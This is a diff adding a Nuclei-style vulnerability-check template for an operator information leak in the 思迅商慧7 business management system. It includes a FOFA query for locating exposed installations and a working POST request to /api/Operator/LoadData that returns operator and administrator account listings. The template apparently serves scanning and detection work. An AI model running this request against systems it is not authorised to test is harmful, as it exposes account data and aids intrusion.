@@ -1,0 +1,47 @@
+id: poc-yaml-sixun-shanghui7-bms-operator-info-leak
+info:
+  name: 思迅商慧7商业管理系统 Operator 信息泄露漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: 信息泄露
+  metadata:
+    finger: 思迅商慧7商业管理系统
+    fofa: app="思迅商慧7商业管理系统"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "思迅商慧7商业管理系统"
+        part: body
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/Operator/LoadData"
+    headers:
+      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+      Accept: "*/*"
+    body: "loadAll=false&oper_role=&field=&operator=&value=1001&gridFlag=OperatorList&page=1&rows=10"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"oper_status\":\"正常\""
+          - "\"oper_name\":"
+          - "系统管理员"
+          - "\"success\":true"
+        part: body
+      - type: word
+        words:
+          - "application/json"
+        part: header
